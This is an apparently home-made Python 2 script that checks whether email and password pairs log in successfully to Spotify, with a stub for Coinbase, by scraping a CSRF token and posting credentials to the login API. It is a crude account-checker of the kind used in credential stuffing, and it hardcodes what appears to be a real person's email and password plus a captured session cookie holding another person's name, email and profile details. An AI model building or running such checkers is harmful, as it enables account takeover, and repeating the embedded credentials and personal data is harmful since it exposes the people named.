__author__  = "Syskema"
__version__ = "1.1.1"

from argparse import ArgumentParser
from time     import sleep

import json
import sys
import traceback
import urllib
import urllib2

class PwnedArgParser(ArgumentParser):
	def error(self, message):
		sys.stderr.write('error: %s\n' %message)
		self.print_help()
		sys.exit(2)

def get_args():
	parser = PwnedArgParser()

	parser.add_argument('-s', '--spotify',action="store_true", dest='spotify', help='Check for Spotify Account valid.')
	parser.add_argument('-c', '--coinbase',action="store_true", dest='coinbase', help='Check for coinbase Account valid.')

	if len(sys.argv) == 1:  # If no arguments were provided, then print help and exit.
		parser.print_help()
		sys.exit(1)

	return parser.parse_args()

def getStr(string, start, end):
	strI = string.split(start);
	strI = strI[1].split(end)
	return strI[0]

def coinbase(raw, params):
	url = 'https://www.coinbase.com/sessions/'
	request_headers = {
	'Host': 'www.coinbase.com',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Referer': 'https://www.coinbase.com/signin',
	'Connection': 'keep-alive',
	'Upgrade-Insecure-Requests': '1'}

	try:
		req = urllib2.Request(url, headers=request_headers)
		response = urllib2.urlopen(req)

		print response.read()
	except Exception as e:
		print str(e)

	return

def spotify(raw, params):
	url = 'https://accounts.spotify.com/en/login'
	request_headers = {
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Encoding':'gzip, deflate',
	'Accept-Language':'pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4',
	'Connection':'keep-alive',
	'Content-Type':'application/x-www-form-urlencoded',
	'Host':'accounts.spotify.com',
	'X-Requested-With':'XMLHttpRequest'}
	
	try:
		req = urllib2.Request(url, headers=request_headers)
		response = urllib2.urlopen(req)
	except Exception as e:
		print str(e)

	csrf_token = getStr(response.info()['Set-Cookie'], 'csrf_token=', ';')

	print "csrf=", csrf_token
	
	url = 'https://accounts.spotify.com/api/login'
	values = {'remember' : 'true',
		'username' : params[0],
		'password' : params[1], 
		'csrf_token' : csrf_token}
	request_headers = {
	'Accept':'application/json, text/plain, */*',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4',
	'Connection':'keep-alive',
	'Content-Type':'application/x-www-form-urlencoded',
	'Host':'accounts.spotify.com',
	'Origin':'https://accounts.spotify.com',
	'Referer':'https://accounts.spotify.com/en/login',
	'Cookie':'sp_t=4485e44df7dc5d581cbf98683b4911cc; sp_last_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22360ispotify%7Cbr%7Cbrand%7Call%7Cgoogle%7Csem%7Ccore%7Cexact%22%2C%22utm_content%22%3A%22growth_paid%22%2C%22utm_term%22%3A%2243700010086290230_c%22%7D; optimizelyEndUserId=oeu1464670136542r0.31149849558794274; mp_329e66c6399f2a6f728674b8c0062881_mixpanel=%7B%22distinct_id%22%3A%20%221550524abab419-00cecaca6a6806-594f2d18-1fa400-1550524abac747%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22utm_source%22%3A%20%22google%22%2C%22utm_medium%22%3A%20%22cpc%22%2C%22utm_campaign%22%3A%20%22360ispotify%7Cbr%7Cbrand%7Call%7Cgoogle%7Csem%7Ccore%7Cexact%22%2C%22utm_content%22%3A%20%22growth_paid%22%2C%22utm_term%22%3A%20%2243700010086290230_c%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com.br%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com.br%22%7D; BOOTSTRAP_CONFIG=%7B%22FB_APP_ID%22%3A%22174829003346%22%2C%22GOOGLE_ANALYTICS_ID%22%3A%22UA-5784146-29%22%2C%22country%22%3A%22BR%22%2C%22locales%22%3A%5B%22pt_BR%22%2C%22pt%22%2C%22en_US%22%2C%22en%22%5D%2C%22BON%22%3A%5B%220%22%2C%220%22%2C1315154354%5D%2C%22user%22%3A%7B%22displayName%22%3A%22Aamer%20Hayat%22%2C%22smallImageUrl%22%3A%22https%3A%2F%2Fscontent.xx.fbcdn.net%2Fv%2Ft1.0-1%2Fp50x50%2F13043207_10210104068977346_3208972760798871832_n.jpg%3Foh%3D6114933782c7c65e0bbf1d55618d5b17%26oe%3D57DC0F8C%22%2C%22largeImageUrl%22%3A%22https%3A%2F%2Fscontent.xx.fbcdn.net%2Fv%2Ft1.0-1%2Fp200x200%2F13043207_10210104068977346_3208972760798871832_n.jpg%3Foh%3D7214a4ca55d62e241e510eeaedd697ab%26oe%3D57D29251%22%7D%2C%22redirect%22%3Anull%7D; spot=%7B%22t%22%3A1464671370%2C%22m%22%3A%22br%22%2C%22p%22%3A%22premium%22%2C%22w%22%3Anull%7D; optimizelySegments=%7B%22172210784%22%3A%22360ispotify%257Cbr%257Cbrand%22%2C%22172815652%22%3A%22referral%22%2C%22172898846%22%3A%22false%22%2C%22173064250%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; __tdev=5Nm6hxLY; __bon=MHwwfC04MDY0ODU4NDN8LTMzODcyNDA1NDA2fDF8MXwxfDE=; _ga=GA1.2.945613829.1464670137; _gat=1; ' + csrf_token + '; fb_continue=https%3A%2F%2Faccounts.spotify.com%2Fen%2Fstatus; remember=aamer.hayat%40gmail.com',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36',
	'X-Requested-With':'XMLHttpRequest'}

	data = urllib.urlencode(values)
	req = urllib2.Request(url, data=data, headers=request_headers)
	
	try:
		response = urllib2.urlopen(req)
	except Exception as e:
		print data
		print "error:", str(e)

	#print "Response:", response

	# Get the URL. This gets the real URL. 
	#print "The URL is: ", response.geturl()

	# Getting the code
	#print "This gets the code: ", response.code

	# Get the Headers. 
	# This returns a dictionary-like object that describes the page fetched, 
	# particularly the headers sent by the server
	#print "The Headers are: ", response.info()

	# Get the date part of the header
	#print "The Date is: ", response.info()['date']

	# Get the server part of the header
	#print "The Server is: ", response.info()['server']

	# Get all data
	#html = response.read()
	#print "Get all data: ", html

	# Get only the length
	#print "Get the length :", len(html)

	# Showing that the file object is iterable
	#for line in response:
	#	print line.rstrip()

	
	#try:
	#	req = urllib2.Request(url, headers=request_headers)
	#	response = urllib2.urlopen(req)
	#	print response.read()
	#except Exception as e:
	#	print str(e)
		
	return

def main():
	opts = get_args()
	
	params = ['fernandes.cadu@gmail.com', '81144027']

	if opts.spotify:
		spotify(None, params)		
	if opts.coinbase:
		coinbase(None, params)		

if __name__ == '__main__':
	main()

